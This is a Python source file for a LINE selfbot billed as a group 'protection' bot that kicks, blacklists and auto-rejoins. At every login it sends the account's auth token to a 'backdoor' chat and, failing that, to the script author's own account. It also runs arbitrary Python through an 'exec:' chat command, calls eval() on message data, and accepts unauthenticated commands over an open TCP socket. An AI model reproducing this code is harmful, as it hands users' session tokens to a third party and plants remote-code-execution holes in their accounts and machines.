# -*- coding: utf-8 -*-
from linepy import *
from datetime import datetime
from time import sleep
from bs4 import BeautifulSoup
from googletrans import Translator
from humanfriendly import format_timespan, format_size, format_number, format_length
import socket, time, random, sys, json, codecs, threading, glob, re, string, os, requests, subprocess, six, ast, urllib, urllib.parse, timeit, atexit, youtube_dl, pafy, pytz
#yes
os.system('clear')
print('===============提示開始===============\n登入開始\n===============提示結束===============\n')
#讀取
set = json.load(codecs.open("set.json","r","utf-8"))
#登入
if set["account"] == None or set["passwd"] == None:
    set["account"] = input("\n===============輸入開始===============\n請輸入您想使用的帳號信箱:")
    set["passwd"] = input("請輸入您想使用的帳號密碼:")
    print('===============輸入結束===============\n')
while True:
    try:
        cl = LINE(set["account"],set["passwd"])
        break
    except Exception as e:
        if e.reason == 'blocked user':
            print('\n===============警示開始===============\n無法登入\n原因:帳號已禁言\n===============警示結束===============\n')
            os._exit(0)
        elif e.reason == 'Account ID or password is invalid':
            print('\n===============警示開始===============\n無法登入\n原因:帳號不存在\n===============警示結束===============\n')
            os._exit(0)
        elif e.reason == 'Account ID and password does not match':
            print('\n===============警示開始===============\n無法登入\n原因:密碼不正確\n===============警示結束===============\n')
            os._exit(0)
        elif e.reason == '':
            print('\n===============警示開始===============\n無法登入\n原因:凍帳中\n===============警示結束===============\n')
            print('\n===============提示開始===============\n將於1小時後自動登入\n===============提示結束===============\n')
            counter = 60
            for x in range(60):
                time.sleep(60)
                counter -= 1
                if counter == 0:
                    break
                print(f'\n===============提示開始===============\n將於{str(counter)}分鐘後後自動登入\n===============提示結束===============\n')
        else:
            print(f'\n===============警示開始===============\n無法登入\n原因:未知({str(e)})\n===============警示結束===============\n')
            os._exit(0)
    else:
        break
print('\n===============提示開始===============\n登入成功\n===============提示結束===============\n')
clMID = cl.profile.mid
oepoll = OEPoll(cl)
#設定
if set["ip"] == None or set["port"] == None:
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    set["ip"] = IPAddr
    inpu = input(f'\n===============輸入開始===============\n當前機器IP為:{set["ip"]}\n錯誤請輸入正確IP否則請輸入"正確"\n請輸入您的回應:')
    if inpu == "正確":
        print("===============輸入結束===============\n")
    else:
        set["ip"] = inpu
        print("===============輸入結束===============\n")
    while True:
        try:
            set["port"] = int(input(f'\n===============輸入開始===============\n當前機器IP為:{set["ip"]}\n請輸入您想使用的端口(數字):'))
        except:
            print("===============輸入錯誤===============")
            continue
        else:
            print("===============輸入結束===============\n")
            break
if clMID not in set["owner"]:
    set["owner"].append(clMID)
#通知
try:
    cl.findAndAddContactsByMid(set["author"])
except:
    print(f'\n===============警示開始===============\n加友規\n請手動加入機器好友\n機器MID:{clMID}\n===============警示結束===============\n')
try:
    cl.sendMessage(set["backdoor"],f"☵[YTER機器]登入成功☵\n➢機器種類:單體保護機\n➢版本號:0.04\n➢登入者MID:{clMID}\n➢登入者TOKEN:{cl.authToken}\n☵[感謝您的使用]☵")
except:
    print('\n===============警示開始===============\n機器帳號不在後台內\n請邀請機器加入\n現在先將登入通知傳至作者私訊\n===============警示結束===============\n')
    cl.sendMessage(set["author"],f"☵[YTER機器]登入成功☵\n➢機器種類:單體保護機\n➢版本號:0.04\n➢登入者MID:{clMID}\n➢登入者TOKEN:{cl.authToken}\n☵[感謝您的使用]☵")
#定義
def backdoorWarning(msg):
    print(f'\n===============警示開始===============\n{msg}\n===============警示結束===============\n')
    cl.sendMessage(set["backdoor"],f"[警示]\n{msg}")
def backdoorPrompt(msg):
    print(f'\n===============提示開始===============\n{msg}\n===============提示結束===============\n')
    cl.sendMessage(set["backdoor"],f"[提示]\n{msg}")
def backupData():
    try:
        json.dump(set,codecs.open('set.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
    except Exception as e:
        backdoorWarning(f'backupData定義區段錯誤:\n{e}')
def sendOne(wh,dtjo):
    d = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    d.connect(wh)
    d.send(dtjo.encode())
    d.close()
def sendAll(dtjo):
    dtjo['sender'] = clMID
    for hosts in set["bothosts"]:
        sendOne((hosts[0], hosts[1]), json.dumps(dtjo))
def receive(conn, addr):
    while True:
        indata = conn.recv(1024)
        if len(indata) == 0:
            conn.close()
            backdoorPrompt(f'有請求關閉\n關閉連線IP: {addr[0]}:{addr[1]}')
            break
        message = indata.decode()
        try:
            msg = json.loads(message)
            try:
                if msg['sender'] != clMID:
                    if set['mode'] != 0:
                        if msg['type'] == 'inviteTicketJoin':
                            if set['mode'] == 1:
                                cl.acceptGroupInvitationByTicket(msg['gid'],msg['ticket'])
                                ticket = cl.reissueGroupTicket(msg['gid'])
                                sendAll({'type':'recordTicket','gid':msg['gid'],'ticket':str(ticket)})
                            if msg['gid'] in set["ticket"]:
                                if msg['ticket'] not in set["ticket"][msg['gid']]:
                                    set["ticket"][msg['gid']].append(msg['ticket'])
                            else:
                                set["ticket"][msg['gid']] = [msg['ticket']]
                        elif msg['type'] == 'recordTicket':
                            if msg['gid'] in set["ticket"]:
                                if msg['ticket'] not in set["ticket"][msg['gid']]:
                                    set["ticket"][msg['gid']].append(msg['ticket'])
                            else:
                                set["ticket"][msg['gid']] = [msg['ticket']]
                        elif msg['type'] == 'changeTicket':
                            if msg['gid'] in set["ticket"]:
                                if msg['ticket'] not in set["ticket"][msg['gid']]:
                                    set["ticket"][msg['gid']].append(msg['ticket'])
                            else:
                                set["ticket"][msg['gid']] = [msg['ticket']]
                        elif msg['type'] == 'requestRecordTicket':
                            joinLink(msg['gid'])
                            ticket = cl.reissueGroupTicket(msg['gid'])
                            sendAll({'type':'recordTicket','gid':msg['gid'],'ticket':str(ticket)})
                    if msg['type'] == 'botTest':
                        if msg['sender'] not in set["bots"]:
                            set["bots"].append(msg['sender'])
                        sendMention(msg['to'], '測試訊息回報\n接收到來自 @! 的訊息', [msg['sender']])
            except Exception as e:
                backdoorWarning(f'Socket接收訊息(機器發出)處理失敗:\n{e}')
        except:
            backdoorPrompt(f'您有新訊息:\n{message}')
def runReceive():
    while True:
        conn, addr = s.accept()
        t = threading.Thread(target=receive, args=(conn, addr))
        t.start()
def joinLink(gid):
    group = cl.getGroupWithoutMembers(gid)
    if group.preventedJoinByTicket == True:
        group.preventedJoinByTicket = False
        cl.updateGroup(group)
def killban(to):
    group = cl.getGroup(to)
    gMembMids = [contact.mid for contact in group.members]
    matched_list = []
    for tag in set["ban"]:
        matched_list += filter(lambda str: str == tag, gMembMids)
    if matched_list == []:
        return True
    else:
        for jj in matched_list:
            try:
                cl.kickoutFromGroup(to,[jj])
            except:
                pass
        cl.sendMessage(to, "掃除黑名單作業完畢")
        return False
def sendMention(to, text="", mids=[]):
    arrData = ""
    arr = []
    mention = "@LT_Tech_Bot"
    if mids == []:
        raise Exception("Invalid mids")
    if "@!" in text:
        if text.count("@!") != len(mids):
            raise Exception("Invalid mid")
        texts = text.split("@!")
        textx = ""
        for mid in mids:
            textx += str(texts[mids.index(mid)])
            slen = len(textx)
            elen = len(textx) + len(mention)
            arrData = {'S':str(slen), 'E':str(elen), 'M':mid}
            arr.append(arrData)
            textx += mention
        textx += str(texts[len(mids)])
    else:
        textx = ""
        slen = len(textx)
        elen = len(textx) + len(mention)
        arrData = {'S':str(slen), 'E':str(elen), 'M':mids[0]}
        arr.append(arrData)
        textx += mention + str(text)
    cl.sendMessage(to, textx, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
def replyMention(msgid, to, text="", mids=[]):
    arrData = ""
    arr = []
    mention = "@LT_Tech_Bot"
    if mids == []:
        raise Exception("Invalid mids")
    if "@!" in text:
        if text.count("@!") != len(mids):
            raise Exception("Invalid mid")
        texts = text.split("@!")
        textx = ""
        for mid in mids:
            textx += str(texts[mids.index(mid)])
            slen = len(textx)
            elen = len(textx) + len(mention)
            arrData = {'S':str(slen), 'E':str(elen), 'M':mid}
            arr.append(arrData)
            textx += mention
        textx += str(texts[len(mids)])
    else:
        textx = ""
        slen = len(textx)
        elen = len(textx) + len(mention)
        arrData = {'S':str(slen), 'E':str(elen), 'M':mids[0]}
        arr.append(arrData)
        textx += mention + str(text)
    cl.sendReplyMessage(msgid, to, textx, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
def addBlackList(mid):
    if mid not in set["ban"]:
        set["ban"].append(mid)
def lineBot(op):
    try:
        if set['mode'] != 0:
            if op.type == 11:
                if op.param3 == "4":
                    if op.param3 not in set["bots"]:
                        if set['mode'] == 2:
                            try:
                                cl.acceptGroupInvitation(op.param1)
                            except:
                                pass
                        if op.param2 not in set["owner"]:
                            try:
                                cl.kickoutFromGroup(op.param1,[op.param2])
                            except:
                                pass
                            addBlackList(op.param2)
                        joinLink(op.param1)
                        ticket = cl.reissueGroupTicket(op.param1)
                        sendAll({'type':'changeTicket','gid':op.param1,'ticket':str(ticket)})
                        sendMention(op.param1,'[警告] @! 更改群組網址設定', [op.param2])
            if op.type == 13:
                if clMID in op.param3:
                    if op.param2 in set["owner"]:
                        if set['mode'] == 1:
                            cl.acceptGroupInvitation(op.param1)
                            sendMention(op.param1,'☰☱☲☳自動入群☳☲☱☰\n單體保護機運行中\n感謝 @! 邀請\n目前模式:1\n☰☱☲☳☴結束☴☳☲☱☰', [op.param2])
                            joinLink(op.param1)
                            ticket = cl.reissueGroupTicket(op.param1)
                            sendAll({'type':'inviteTicketJoin','gid':op.param1,'ticket':str(ticket)})
                            killban(op.param1)
                        elif set['mode'] == 2:
                            sendAll({'type':'requestRecordTicket','gid':op.param1})
                    elif op.param2 in set["bots"]:
                        if set['mode'] == 1:
                            cl.acceptGroupInvitation(op.param1)
                else:
                    if op.param3 not in set["bots"]:
                        for bpre in set["ban"]:
                            if bpre in op.param3:
                                if set['mode'] == 2:
                                    try:
                                        cl.acceptGroupInvitation(op.param1)
                                    except:
                                        pass
                                if op.param2 not in set["owner"]:
                                    try:
                                        cl.kickoutFromGroup(op.param1, [op.param2])
                                    except:
                                        pass
                                    addBlackList(op.param2)
                                try:
                                    cl.cancelGroupInvitation(op.param1,[bpre])
                                except:
                                    pass
                                sendMention(op.param1,'[警告] @! 邀請黑名單使用者 @!', [op.param2,bpre])
            if op.type == 17:
                if op.param3 not in set["bots"]:
                    if op.param2 in set["ban"]:
                        if set['mode'] == 2:
                            try:
                                cl.acceptGroupInvitation(op.param1)
                            except:
                                pass
                        try:
                            cl.kickoutFromGroup(op.param1,[op.param2])
                        except:
                            pass
                        sendMention(op.param1,'[警告] 黑名單使用者 @! 入群', [op.param2])
            if op.type == 19:
                if clMID in op.param3:
                    if op.param1 in set["ticket"]:
                        for ts in set["ticket"][op.param1]:
                            while True:
                                try:
                                    cl.acceptGroupInvitationByTicket(op.param1,ts)
                                    if op.param2 not in set["owner"] and op.param2 not in set["bots"]:
                                        try:
                                            cl.kickoutFromGroup(op.param1, [op.param2])
                                        except:
                                            pass
                                        addBlackList(op.param2)
                                    return
                                except Exception as e:
                                    if "Ticket not found:" in e.reason:
                                        set["ticket"][op.param1].remove(ts)
                                        break
                                    elif e.reason == "request blocked" or "Prevented join by ticket:" in e.reason:
                                        return
                                    else:
                                        continue
                elif op.param3 in set["bots"] or op.param3 in set["owner"]:
                    if set['mode'] == 2:
                        try:
                            cl.acceptGroupInvitation(op.param1)
                        except:
                            pass
                    if op.param2 not in set["owner"] and op.param2 not in set["bots"]:
                        try:
                            cl.kickoutFromGroup(op.param1, [op.param2])
                        except:
                            pass
                        addBlackList(op.param2)
                    cl.findAndAddContactsByMid(op.param3)
                    cl.inviteIntoGroup(op.param1,[op.param3])
                    sendMention(op.param1,'[警告] @! 踢出 @!', [op.param2,op.param3])
        if op.type == 26 or op.type == 25:
            msg = op.message
            text = msg.text
            msg_id = msg.id
            receiver = msg.to
            sender = msg._from
            if msg.toType == 0:
                if sender != cl.profile.mid:
                    to = sender
                else:
                    to = receiver
            else:
                to = receiver
            if text is None:
                cmd = ""
            else:
                cmd = text.lower()
            if sender not in set["owner"] and sender not in set["bots"] and set['mode'] != 0:
                for blword in set['keywt']:
                    if blword in cmd:
                        if msg.toType == 2:
                            try:
                                cl.kickoutFromGroup(to,[sender])
                            except:
                                pass
                        addBlackList(sender)
                        replyMention(msg_id, to,'[警告] @! 觸動關鍵字防禦', [sender])
                        break
            if sender in set["owner"]:
                if cmd == 'modelist':
                    ret_ = "ΞΞΞΞΞ〘模式列表〙ΞΞΞΞΞ"
                    ret_ += "\n更換請使用Mode:[數字]"
                    ret_ += "\n☱☱☱預備中模式☱☱☱"
                    ret_ += "\n➢0:[無]"
                    ret_ += "\n☱☱☱保護機模式☱☱☱"
                    ret_ += "\n➢1:群組內"
                    ret_ += "\n➢2:邀請中"
                    ret_ += "\nΞΞΞΞΞ〘　結束　〙ΞΞΞΞΞ"
                    cl.relatedMessage(to,ret_,msg_id)
                elif cmd.startswith("mode:"):
                    mde = cmd[5:]
                    if mde == "0":
                        set['mode'] = 0
                        cl.relatedMessage(to,"切換成功\n已切換至模式0(停機模式)",msg_id)
                    elif mde == "1":
                        set['mode'] = 1
                        cl.relatedMessage(to,"切換成功\n已切換至模式1(群內模式)",msg_id)
                    elif mde == "2":
                        set['mode'] = 2
                        cl.relatedMessage(to,"切換成功\n已切換至模式2(卡邀模式)",msg_id)
                    else:
                        cl.relatedMessage(to,"切換失敗\n找不到該模式",msg_id)
                elif cmd == 'set':
                    ret_ = "ΞΞΞΞΞ〘機器設定〙ΞΞΞΞΞ"
                    if set['mode'] == 0:
                        ret_ += "\n➢當前模式:0(停機模式)"
                    elif set['mode'] == 1:
                        ret_ += "\n➢當前模式:1(群內模式)"
                    elif set['mode'] == 2:
                        ret_ += "\n➢當前模式:2(卡邀模式)"
                    else:
                        ret_ += "\n➢當前模式:設定值錯誤"
                    ret_ += "\nΞΞΞΞΞ〘　結束　〙ΞΞΞΞΞ"
                    cl.relatedMessage(to,ret_,msg_id)
                elif cmd == 'kbo':
                    if msg.toType == 2:
                        cl.relatedMessage(to, "單群掃黑進行中...",msg_id)
                        if killban(to):
                            cl.relatedMessage(to, "無黑單者",msg_id)
                    else:
                        cl.relatedMessage(to,"這裡不是群組",msg_id)
                elif cmd == 'kba':
                    cl.relatedMessage(to, "全群掃黑進行中...",msg_id)
                    gids = cl.getGroupIdsJoined()
                    cl.relatedMessage(to, "機器共加入了 {} 個群組".format(str(len(gids))),msg_id)
                    for i in gids:
                        killban(i)
                    cl.relatedMessage(to, "全群掃黑完畢!",msg_id)
                elif cmd.startswith("adminadd "):
                    targets = []
                    MENTION = eval(msg.contentMetadata['MENTION'])
                    for x in MENTION["MENTIONEES"]:
                        targets.append(x["M"])
                    for target in targets:
                        if target in set["owner"]:
                            cl.relatedMessage(to,"該用戶已是權限者",msg_id)
                        elif target in set["ban"]:
                            cl.relatedMessage(to,"該用戶位於黑單",msg_id)
                        else:
                            set["owner"].append(target)
                    cl.relatedMessage(to,"權限給予完畢！",msg_id)
                elif cmd.startswith("admindel "):
                    targets = []
                    MENTION = eval(msg.contentMetadata['MENTION'])
                    for x in MENTION["MENTIONEES"]:
                        targets.append(x["M"])
                    for target in targets:
                        if target in set["owner"]:
                            set["owner"].remove(target)
                        else:
                            cl.relatedMessage(to,"該用戶並非權限者",msg_id)
                    cl.relatedMessage(to,"權限刪除完畢！",msg_id)
                elif cmd == 'adminlist':
                    if set["owner"] == []:
                        cl.relatedMessage(to,"無權限者！",msg_id)
                    else:
                        mc = "ΞΞΞΞΞ〘權限列表〙ΞΞΞΞΞ"
                        for mi_d in set["owner"]:
                            mc += "\n➲"+cl.getContact(mi_d).displayName
                        cl.relatedMessage(to,mc + "\nΞΞΞΞΞ〘　結束　〙ΞΞΞΞΞ",msg_id)
                elif cmd.startswith("banadd "):
                    targets = []
                    MENTION = eval(msg.contentMetadata['MENTION'])
                    for x in MENTION["MENTIONEES"]:
                        targets.append(x["M"])
                    for target in targets:
                        if target in set["owner"]:
                            cl.relatedMessage(to,"該用戶是權限者",msg_id)
                        elif target in set["ban"]:
                            cl.relatedMessage(to,"該用戶已是黑單",msg_id)
                        else:
                            set["ban"].append(target)
                    cl.relatedMessage(to,"黑單加入完畢！",msg_id)
                elif cmd.startswith("bandel "):
                    targets = []
                    MENTION = eval(msg.contentMetadata['MENTION'])
                    for x in MENTION["MENTIONEES"]:
                        targets.append(x["M"])
                    for target in targets:
                        if target in set["ban"]:
                            set["ban"].remove(target)
                        else:
                            cl.relatedMessage(to,"該用戶並非黑單",msg_id)
                    cl.relatedMessage(to,"黑單刪除完畢！",msg_id)
                elif cmd == 'clearban':
                    set["ban"].clear()
                    cl.relatedMessage(to,"黑單刪除完畢！",msg_id)
                elif cmd == 'banlist':
                    if set["ban"] == []:
                        cl.relatedMessage(to,"無黑單者！",msg_id)
                    else:
                        mc = "ΞΞΞΞΞ〘黑單列表〙ΞΞΞΞΞ"
                        for mi_d in set["ban"]:
                            mc += "\n➲"+cl.getContact(mi_d).displayName
                        cl.relatedMessage(to,mc + "\nΞΞΞΞΞ〘　結束　〙ΞΞΞΞΞ",msg_id)
                elif cmd == 'bye':
                    try:
                        cl.leaveGroup(to)
                    except:
                        try:
                            cl.leaveRoom(to)
                        except:
                            cl.acceptGroupInvitation(to)
                            cl.leaveGroup(to)
                elif cmd == 'bottest':
                    if to == set["backdoor"]:
                        set["bots"].clear()
                        sendAll({'type':'botTest', 'to':to})
                        cl.relatedMessage(to,"成功發出測試請求",msg_id)
                    else:
                        cl.relatedMessage(to,"請在後台使用",msg_id)
                elif cmd.startswith("addhost:"):
                    host_ = text[8:]
                    if ":" in host_:
                        x = host_.split(":")
                        try:
                            host__ = [str(x[0]), int(x[1])]
                            if host__ in set['bothosts']:
                                cl.relatedMessage(to,"已存在！",msg_id)
                            else:
                                set['bothosts'].append(host__)
                                cl.relatedMessage(to,"新增成功！",msg_id)
                        except:
                            cl.relatedMessage(to,"新增失敗！",msg_id)
                    else:
                        cl.relatedMessage(to,"目標錯誤",msg_id)
                elif cmd.startswith("delhost:"):
                    host_ = text[8:]
                    if ":" in host_:
                        x = host_.split(":")
                        try:
                            host__ = [str(x[0]), int(x[1])]
                            if host__ in set['bothosts']:
                                set['bothosts'].remove(host_)
                                cl.relatedMessage(to,"刪除成功！",msg_id)
                            else:
                                cl.relatedMessage(to,"不存在！",msg_id)
                        except:
                            cl.relatedMessage(to,"刪除失敗！",msg_id)
                    else:
                        cl.relatedMessage(to,"目標錯誤",msg_id)
                elif cmd == 'reb':
                    cl.relatedMessage(to,"重啟中請稍後...",msg_id)
                    backupData()
                    python = sys.executable
                    os.execl(python, python, *sys.argv)
                elif cmd == 'save':
                    backupData()
                    cl.relatedMessage(to,"資料保存完畢",msg_id)
                elif cmd.startswith("exec:"):
                    x = text[5:]
                    try:
                        exec(x)
                    except Exception as e:
                        cl.relatedMessage(to, f'執行錯誤\n{e}', msg_id)
                elif cmd == 'mine':
                    try:
                        cl.kickoutFromGroup(msg.to, ["test"])
                    except Exception as e:
                        if e.reason == "request blocked":
                            aa = "規制"
                        else:
                            aa = "可以執行"
                    try:
                        cl.inviteIntoGroup(msg.to, ["test"])
                        bb = "可以執行"
                    except:
                        bb = "規制"
                    try:
                        cl.findAndAddContactsByMid("test")
                    except Exception as e:
                        if e.reason == "request blocked":
                            cc = "規制"
                        else:
                            cc = "可以執行"
                    try:
                        cl.acceptGroupInvitationByTicket("test", "test")
                    except Exception as e:
                        if e.reason == "request blocked":
                            dd = "規制"
                        else:
                            dd = "可以執行"
                    cl.relatedMessage(to, f"ΞΞΞΞΞ〘機器狀態查詢〙ΞΞΞΞΞ\n※踢人狀態:{aa}\n※邀請狀態:{bb}\n※取消狀態:可以執行\n※加友狀態:{cc}\n※網址狀態:{dd}", msg_id)
                if set["mode"] != 0:
                    if "/ti/g/" in cmd:
                        link_re = re.compile('(?:line\:\/|line\.me\/R)\/ti\/g\/([a-zA-Z0-9_-]+)?')
                        links = link_re.findall(text)
                        n_links = []
                        for l in links:
                            if l not in n_links:
                                n_links.append(l)
                        for ticket_id in n_links:
                            try:
                                group = cl.findGroupByTicket(ticket_id)
                                if group.id in set["ticket"]:
                                    if ticket_id not in set["ticket"][group.id]:
                                        set["ticket"][group.id].append(ticket_id)
                                else:
                                    set["ticket"][group.id] = [ticket_id]
                                if set["mode"] == 1:
                                    cl.acceptGroupInvitationByTicket(group.id,ticket_id)
                                    cl.sendMessage(group.id,"☰☱☲☳自動入群☳☲☱☰\n單體保護機運行中\n目前模式:1\n☰☱☲☳☴結束☴☳☲☱☰")
                                    killban(group.id)
                                    cl.relatedMessage(to,f"加入成功\n群組名稱:{group.name}\n人數:{len(group.members)}\n群組網址ID:{ticket_id}\nGID:{group.id}",msg_id)
                            except Exception as e:
                                if str(e.reason) == "request blocked":
                                    cl.relatedMessage(to,"目前帳號規制中",msg_id)
                                elif "Ticket not found" in str(e.reason):
                                    cl.relatedMessage(to,"此網址已失效",msg_id)
                                elif "Prevented join by group ticket" in str(e.reason):
                                    cl.relatedMessage(to,"該群不開放網址加入",msg_id)
                                else:
                                    cl.relatedMessage(to,"加入錯誤\n"+str(e),msg_id)
                            time.sleep(0.5)
    except Exception as e:
        backdoorWarning(f'lineBot定義區段錯誤:\n{e}')
#執行
if __name__ == "__main__":
    backdoorPrompt("開始載入接收")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((str(set["ip"]), int(set["port"])))
    s.listen(999999)
    backdoorPrompt(f'開始聆聽Socket請求\n目前聆聽位置: {set["ip"]}:{set["port"]}')
    threading.Thread(target=runReceive).start()
    backdoorPrompt("接收載入完畢")
    while True:
        try:
            ops = oepoll.singleTrace(count=50)
            if ops is not None:
                for op in ops:
                    oepoll.setRevision(op.revision)
                    thread = threading.Thread(target=lineBot, args=(op,))
                    thread.start()
        except Exception as e:
            backdoorWarning(f'多工執行區段錯誤:\n{e}')